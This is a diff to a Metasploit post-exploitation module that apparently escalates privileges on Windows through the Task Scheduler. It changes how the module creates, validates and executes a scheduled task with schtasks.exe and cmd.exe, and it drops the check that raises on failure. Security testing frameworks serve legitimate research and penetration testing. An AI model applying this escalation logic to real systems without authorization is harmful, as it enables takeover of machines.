@@ -1,8 +1,4 @@
 ##
-# $Id$
-##
-
-##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # Framework web site for more information on licensing and terms of use.
@@ -10,11 +6,13 @@
 ##
 
 require 'msf/core'
+require 'msf/core/post/common'
 require 'rex'
 require 'zlib'
 
 
 class Metasploit3 < Msf::Post
+	include Msf::Post::Common
 
 	def initialize(info={})
 		super(update_info(info,
@@ -165,7 +163,13 @@ class Metasploit3 < Msf::Post
 
 		print_status("Creating task: #{taskname}")
 		cmdline = "schtasks.exe /create /tn #{taskname} /tr \"#{cmd}\" /sc monthly /f"
-		exec_schtasks(cmdline, "create the task")
+#		print_debug("Will Execute:\n\t#{cmdline}")
+		begin
+			exec_schtasks(cmdline, "create the task")
+		rescue ::Exception => e
+			print_error(e.to_s)
+			return
+		end
 
 		#
 		# Read the contents of the newly creates task file
@@ -229,6 +233,12 @@ class Metasploit3 < Msf::Post
 		fd = session.fs.file.new(taskfile, "wb")
 		fd.write "\xff\xfe" + content
 		fd.close
+
+		#
+		# Validate our results
+		#
+		print_status("Validating task: #{taskname}")
+		exec_schtasks("schtasks.exe /query /tn #{taskname}", "validate the task")
 
 		#
 		# Run the task :-)
@@ -341,17 +351,19 @@ class Metasploit3 < Msf::Post
 	end
 
 	def exec_schtasks(cmdline, purpose)
-		lns = cmd_exec("cmd.exe /c " + cmdline + " && echo SCHELEVATOR")
+		cmdline = "/c #{cmdline.strip}"#&& echo SCHELEVATOR"
+		lns = cmd_exec('cmd.exe', cmdline)
+
 		success = false
 		lns.each_line { |ln|
 			ln.chomp!
-			if ln =~ /^SCHELEVATOR$/
+			if ln =~ /^SUCCESS\:\s/
 				success = true
+				print_status(ln)
 			else
 				print_status(ln)
 			end
 		}
-		raise "Unable to #{purpose}!" if not success
 	end
 
 
